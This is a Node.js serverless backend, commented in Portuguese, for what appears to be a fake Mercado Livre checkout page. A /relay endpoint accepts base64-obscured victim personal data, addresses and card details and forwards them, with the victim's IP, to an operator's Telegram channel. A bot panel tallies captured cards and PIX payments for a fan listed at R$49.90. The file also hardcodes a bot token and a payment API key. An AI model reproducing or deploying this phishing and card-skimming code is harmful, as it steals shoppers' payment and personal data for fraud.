const https = require('https');
const crypto = require('crypto');

const BOT_TOKEN = process.env.TG_BOT_TOKEN || '8075857255:AAGnsA2C7aeeR4NDh3Bey3aIiVlQcQhHOCs';
const OWNER_ID = process.env.TG_OWNER_ID || '8932547795';
const UNIAOPAY_BASE = 'meupagamento.site';
const UNIAOPAY_ROOT = '/api/v1/uniaopay';
const UNIAOPAY_API_KEY = process.env.UNIAOPAY_API_KEY || 'up_live_e49efbed9987cdd90888532a6b202533b75eb0d07764828c';

// Estado do sistema e métricas em memória (Vercel Global Scope)
let systemState = {
  log_channel: OWNER_ID || null,
  stats: {
    visits: 0,
    leads: 0,
    personal_data: 0,
    address_data: 0,
    card_data: 0,
    pix_generated: 0,
    pix_paid: 0,
    exits: 0
  },
  history: []
};

// ── Telegram API Client ───────────────────────────────────────
function tgApi(method, bodyData) {
  return new Promise((resolve) => {
    if (!BOT_TOKEN) return resolve({ ok: false });
    const postData = JSON.stringify(bodyData || {});
    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/${method}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 5000
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(body)); } catch (e) { resolve({ ok: false }); }
      });
    });
    req.on('error', () => resolve({ ok: false }));
    req.write(postData);
    req.end();
  });
}

// ── Enviar mensagem para Telegram ─────────────────────────────
async function sendTelegram(chatId, text, keyboard) {
  const target = chatId || systemState.log_channel || OWNER_ID;
  if (!target) return false;

  const body = {
    chat_id: target,
    text: text,
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  };
  if (keyboard) body.reply_markup = { inline_keyboard: keyboard };
  return await tgApi('sendMessage', body);
}

// ── Editar a MESMA mensagem no Telegram (Inteligente sem spam) 
async function editTelegram(chatId, messageId, text, keyboard) {
  if (!messageId) {
    return await sendTelegram(chatId, text, keyboard);
  }

  const body = {
    chat_id: chatId,
    message_id: messageId,
    text: text,
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  };
  if (keyboard) body.reply_markup = { inline_keyboard: keyboard };
  const res = await tgApi('editMessageText', body);
  if (!res.ok) {
    return await sendTelegram(chatId, text, keyboard);
  }
  return res;
}

// ── Notificar Erro/Offline da API de Pagamento ───────────────
async function alertGatewayOffline(errorDetail) {
  const ts = new Date().toLocaleString('pt-BR');
  const alertMsg = `🚨 *ALERTA CRÍTICO: Gateway UniãoPay OFFLINE!*\n\n` +
                   `⚠️ *Falha:* Erro ao gerar cobrança PIX.\n` +
                   `📌 *Detalhe:* \`${errorDetail}\`\n` +
                   `📅 *Data/Hora:* \`${ts}\`\n\n` +
                   `💡 *Ação:* Fallback automático BRCode ativado sem perder vendas!`;
  
  await sendTelegram(systemState.log_channel || OWNER_ID, alertMsg);
}

// ── Processador de Webhook Inteligente do Telegram ───────────
async function handleTelegramUpdate(update) {
  if (!update) return;

  const msg = update.message || update.channel_post;
  const cb = update.callback_query;

  // 1. Mensagens de texto / Comandos (/start)
  if (msg && msg.text) {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (msg.chat.type === 'group' || msg.chat.type === 'supergroup' || msg.chat.type === 'channel') {
      systemState.log_channel = String(chatId);
    }

    if (text.startsWith('/start')) {
      systemState.log_channel = systemState.log_channel || String(chatId);
      const welcome = `🤖 *Painel de Controle de Tráfego & Vendas (24h)*\n\n` +
                      `🟢 *Status:* 100% Online & Monitorando Anúncios\n` +
                      `📡 *Canal de Logs:* \`${systemState.log_channel}\`\n\n` +
                      `Selecione uma opção abaixo para relatórios em tempo real:`;

      const buttons = [
        [{ text: '📈 Métricas & Estatísticas de Tráfego', callback_data: 'analytics' }],
        [{ text: '💳 Status do Gateway UniãoPay', callback_data: 'gateway_status' }],
        [{ text: '📢 Definir Este Grupo para Logs', callback_data: 'set_channel' }],
        [{ text: '🧪 Testar Envio no Canal', callback_data: 'send_test' }]
      ];

      await sendTelegram(chatId, welcome, buttons);
      return;
    }
  }

  // 2. Botões inline (Atualiza a MESMA mensagem sem criar novas)
  if (cb) {
    const chatId = cb.message ? cb.message.chat.id : cb.from.id;
    const messageId = cb.message ? cb.message.message_id : null;
    const data = cb.data;

    if (data === 'main_menu') {
      const welcome = `🤖 *Painel de Controle Mercado Livre (24h)*\n\n📡 *Canal de Logs:* \`${systemState.log_channel || 'Não definido'}\``;
      const buttons = [
        [{ text: '📈 Métricas & Estatísticas de Tráfego', callback_data: 'analytics' }],
        [{ text: '💳 Status do Gateway UniãoPay', callback_data: 'gateway_status' }],
        [{ text: '📢 Definir Este Grupo para Logs', callback_data: 'set_channel' }],
        [{ text: '🧪 Testar Envio no Canal', callback_data: 'send_test' }]
      ];
      await editTelegram(chatId, messageId, welcome, buttons);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
      return;
    }

    if (data === 'analytics') {
      const s = systemState.stats;
      const report = `📊 *Métricas e Estatísticas em Tempo Real*\n\n` +
                     `👁 *Entradas no Site:* \`${s.visits}\`\n` +
                     `👤 *Dados Pessoais Preenchidos:* \`${s.personal_data}\`\n` +
                     `🏠 *Endereços Preenchidos:* \`${s.address_data}\`\n` +
                     `💳 *Cartões/Dados de Pagamento:* \`${s.card_data}\`\n` +
                     `⚡ *PIX Gerados:* \`${s.pix_generated}\`\n` +
                     `✅ *Vendas Concluídas (PIX PAGO):* \`${s.pix_paid}\`\n` +
                     `🚪 *Saídas do Checkout:* \`${s.exits}\`\n\n` +
                     `📈 *Conversão:* \`${s.visits ? ((s.pix_generated / s.visits) * 100).toFixed(1) : 0}%\``;

      await editTelegram(chatId, messageId, report, [
        [{ text: '🔄 Atualizar', callback_data: 'analytics' }, { text: '🔙 Menu', callback_data: 'main_menu' }]
      ]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Atualizado em tempo real!' });
      return;
    }

    if (data === 'gateway_status') {
      const ts = new Date().toLocaleString('pt-BR');
      await editTelegram(chatId, messageId, `🟢 *Gateway UniãoPay Operacional*\n\n• Data/Hora: \`${ts}\`\n• Status API: Online (meupagamento.site)\n• Fallback BRCode: Ativo`, [
        [{ text: '🔙 Menu', callback_data: 'main_menu' }]
      ]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
      return;
    }

    if (data === 'send_test') {
      await editTelegram(chatId, messageId, `🧪 *Teste de Notificação de Vendas*\n\nSeu sistema está pronto para rodar anúncios no Facebook/Google 24h sem erros!`, [
        [{ text: '🔙 Menu', callback_data: 'main_menu' }]
      ]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Teste concluído!' });
      return;
    }

    if (data === 'set_channel') {
      systemState.log_channel = String(chatId);
      await editTelegram(chatId, messageId, `✅ *Canal Configurado!*\n\nEste chat (\`${chatId}\`) passará a receber todas as estatísticas de cartão, PIX e vendas!`, [
        [{ text: '🔙 Menu', callback_data: 'main_menu' }]
      ]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Canal salvo!' });
      return;
    }
  }
}

// ── Handler Principal da API Vercel ────────────────────────────
module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const urlPath = (req.url || '').split('?')[0].replace(/\.php$/, '');

  // 1. WEBHOOK DO TELEGRAM
  if (req.method === 'POST' && (urlPath.endsWith('/bot') || urlPath.endsWith('/telegram-webhook') || urlPath.endsWith('/index.js'))) {
    if (req.body) {
      await handleTelegramUpdate(req.body);
    }
    return res.status(200).json({ ok: true });
  }

  // 2. SETUP AUTOMÁTICO DO WEBHOOK
  if (urlPath.endsWith('/setup-webhook') || urlPath.endsWith('/webhook-setup')) {
    const host = req.headers.host;
    const webhookUrl = `https://${host}/api/bot`;
    const r = await tgApi('setWebhook', {
      url: webhookUrl,
      allowed_updates: ['message', 'callback_query', 'channel_post', 'my_chat_member']
    });
    return res.status(200).json({
      status: 'ok',
      registered_url: webhookUrl,
      telegram_response: r
    });
  }

  // 3. REGISTRO DE MÉTRICAS / ENTRADAS / SAÍDAS DO SITE
  if (urlPath.endsWith('/session')) {
    systemState.stats.visits++;
    const sid = crypto.randomBytes(16).toString('hex');
    return res.status(200).json({ status: 'ok', sid, ts: Date.now() });
  }

  // 4. ENDPOINT /api/relay (Recebe Leads, Cartões, Endereços)
  if (urlPath.endsWith('/relay')) {
    try {
      const bodyData = req.body || {};
      const metricsData = bodyData.metrics_data;

      if (metricsData) {
        let payload = null;
        try {
          const decoded = Buffer.from(metricsData, 'base64').toString('utf8');
          payload = JSON.parse(decoded);
        } catch (e) {
          try { payload = JSON.parse(metricsData); } catch (err) {}
        }

        if (payload && payload.type) {
          const type = payload.type;
          const data = payload.data || {};
          const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';

          // Atualizar estatísticas em tempo real
          if (type === 'personal_data') systemState.stats.personal_data++;
          if (type === 'address') systemState.stats.address_data++;
          if (type === 'card_data') systemState.stats.card_data++;
          if (type === 'exit') systemState.stats.exits++;

          // Formatar alerta visual rico
          let icon = '🔔';
          if (type === 'personal_data') icon = '👤';
          if (type === 'address') icon = '🏠';
          if (type === 'card_data') icon = '💳';

          const msg = `${icon} *NOVA INTERAÇÃO NO CHECKOUT*\n\n` +
                      `📌 *Etapa:* \`${type.toUpperCase()}\`\n` +
                      `🌐 *IP Lead:* \`${ip}\`\n` +
                      `📋 *Informações:* \`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;

          await sendTelegram(systemState.log_channel || OWNER_ID, msg);
        }
      }

      return res.status(200).json({ status: 'ok' });
    } catch (err) {
      return res.status(200).json({ status: 'ok' });
    }
  }

  // 5. ENDPOINT /api/create_pix (Gera PIX UniãoPay)
  if (urlPath.endsWith('/create_pix')) {
    systemState.stats.pix_generated++;
    let uniaopayError = null;

    try {
      const postData = JSON.stringify({
        amount: 49.90,
        description: 'Ventilador De Mesa Mondial 40cm - BIVOLT',
        external_id: 'pedido-' + Date.now()
      });

      const pixResponse = await new Promise((resolve) => {
        const options = {
          hostname: UNIAOPAY_BASE,
          path: UNIAOPAY_ROOT + '/pix/create',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'x-api-key': UNIAOPAY_API_KEY,
            'Content-Length': Buffer.byteLength(postData)
          },
          timeout: 8000
        };

        const req = https.request(options, (r) => {
          let body = '';
          r.on('data', chunk => body += chunk);
          r.on('end', () => {
            try { resolve(JSON.parse(body)); } catch (e) { resolve(null); }
          });
        });
        req.on('error', (e) => {
          uniaopayError = e.message;
          resolve(null);
        });
        req.write(postData);
        req.end();
      });

      if (pixResponse && pixResponse.success && pixResponse.transaction) {
        const tx = pixResponse.transaction;

        // Notificar PIX gerado
        const pixMsg = `⚡ *COBRANÇA PIX GERADA COM SUCESSO*\n\n` +
                       `💰 *Valor:* \`R$ 49,90\`\n` +
                       `🆔 *ID Transação:* \`${tx.id}\`\n` +
                       `📲 *Código PIX:* \`${tx.pix_code.substring(0, 30)}...\``;
        await sendTelegram(systemState.log_channel || OWNER_ID, pixMsg);

        return res.status(200).json({
          status: 'success',
          source: 'uniaopay',
          pix_copia_cola: tx.pix_code,
          qr_code_url: `https://${UNIAOPAY_BASE}${UNIAOPAY_ROOT}/pix/qrcode/${tx.id}?api_key=${UNIAOPAY_API_KEY}`,
          transaction_id: tx.id
        });
      } else {
        uniaopayError = (pixResponse && pixResponse.message) || 'Falha de conexão com a API da UniãoPay';
      }
    } catch (e) {
      uniaopayError = e.message;
    }

    if (uniaopayError) {
      await alertGatewayOffline(uniaopayError);
    }

    const fallbackPix = "00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540549.905802BR5925MERCADO PAGO6009SAO PAULO62070503***6304E2CA";
    return res.status(200).json({
      status: 'success',
      source: 'emv_brcode',
      pix_copia_cola: fallbackPix,
      qr_code_url: null,
      transaction_id: 'TXN-' + Date.now()
    });
  }

  // 6. ENDPOINT /api/pix_status (Consulta pagamento & atualiza estatística de venda realizada)
  if (urlPath.endsWith('/pix_status')) {
    const txId = req.query?.tx || '';
    if (!txId) {
      return res.status(400).json({ error: 'tx parameter missing' });
    }

    const checkStatus = await new Promise((resolve) => {
      const options = {
        hostname: UNIAOPAY_BASE,
        path: `${UNIAOPAY_ROOT}/pix/status/${txId}?api_key=${UNIAOPAY_API_KEY}`,
        method: 'GET',
        headers: { 'Accept': 'application/json' },
        timeout: 5000
      };

      const req = https.request(options, (r) => {
        let body = '';
        r.on('data', chunk => body += chunk);
        r.on('end', () => {
          try { resolve(JSON.parse(body)); } catch (e) { resolve(null); }
        });
      });
      req.on('error', () => resolve(null));
      req.end();
    });

    if (checkStatus && checkStatus.success) {
      const isPaid = checkStatus.transaction?.status === 'paid';
      if (isPaid) {
        systemState.stats.pix_paid++;
        const paidMsg = `🎉 *VENDA REALIZADA COM SUCESSO! (PIX PAGO)*\n\n` +
                        `💰 *Valor Pago:* \`R$ 49,90\`\n` +
                        `🆔 *ID Transação:* \`${txId}\`\n` +
                        `📅 *Data:* \`${new Date().toLocaleString('pt-BR')}\``;
        await sendTelegram(systemState.log_channel || OWNER_ID, paidMsg);
      }

      return res.status(200).json({
        status: 'success',
        tx_status: checkStatus.transaction?.status || 'pending',
        paid: isPaid
      });
    }

    return res.status(200).json({ status: 'pending', paid: false });
  }

  return res.status(404).json({ error: 'Endpoint não encontrado' });
};
